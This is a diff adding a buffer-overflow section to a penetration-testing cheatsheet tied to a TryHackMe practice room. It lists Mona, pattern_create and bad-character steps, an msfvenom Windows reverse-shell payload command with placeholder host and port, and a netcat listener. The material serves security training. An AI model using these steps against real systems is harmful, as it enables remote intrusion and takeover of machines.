@@ -534,6 +534,64 @@ upload {FILE.exe}
 # {FILE.exe}:   File to be uploaded from client machine
 ```
 
+
+<br />
+
+# Buffer Overflow
+
+***
+<br />
+
+https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst
+
+https://tryhackme.com/room/bufferoverflowprep
+
+```bash
+
+# Setup Mona config in debugger and run application
+!mona config -set workingfolder c:\mona\%p
+
+# Fuzz application using a script
+python3 fuzzing.py
+
+# Create unique pattern with amount of fuzz from previous step
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {FUZZ RESPONSE + 400}
+
+# Exploit using payload from previous step
+python3 exploit.py
+
+# Find the overflow offset
+!mona findmsp -distance {FUZZ RESPONSE + 400}
+
+# Update offset in exploit.py for EIP and ESP registers
+offset = {OFFSET}
+retn = "{(ESP OFFSET - EIP OFFSET) * B}"
+
+# Generate bad char bytearray in Mona starting with 00
+!mona bytearray -b "\x00"
+
+# Generate bar char list in python and update payload
+python3 badchar.py
+
+# Exploit and compare against the Mona bytearray until no bad chars are left
+python3 exploit.py
+!mona compare -f C:\mona\appname\bytearray.bin -a <address>
+
+# Find the Jump Point
+!mona jmp -r esp -cpb "{BAD CHAR LIST}"
+
+# Generate Payload
+msfvenom -p windows/shell_reverse_tcp LHOST={IP ADDRESS} LPORT={PORT} EXITFUNC=thread -b "{BAD CHAR LIST}" -f c
+
+# Update exploit.py with address, payload, and padding
+retn = {Reverse jump address including \x}
+payload = {Payload from msfvenom ("PAYLOAD")}
+padding = "\x90" * 16
+
+# Start NC on msfvenom IP and Port and exploit
+sudo nc -lnvp {PORT}
+python3 exploit.py
+
 <br />
 
 # Password Cracking
